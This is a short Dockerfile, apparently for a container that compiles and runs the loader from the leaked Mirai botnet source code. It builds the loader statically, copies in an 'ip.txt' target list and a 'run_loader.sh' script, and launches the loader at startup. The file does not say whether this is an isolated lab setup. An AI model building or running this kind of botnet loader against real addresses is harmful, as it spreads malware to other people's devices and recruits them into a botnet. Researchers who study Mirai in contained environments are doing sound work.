FROM debian


RUN apt update && apt install -y wget golang git electric-fence

WORKDIR /app


COPY ./Mirai-Source-Code/loader/ /app/loader_dir

# build loader

RUN gcc -static -O3 -lpthread -pthread /app/loader_dir/src/*.c -o loader_app -DDEBUG

COPY ./ip.txt /app/ip.txt
COPY ./run_loader.sh /app/run_loader.sh

RUN cat /app/ip.txt

RUN cat /app/loader_app

EXPOSE 80

CMD ["bash", "/app/run_loader.sh"]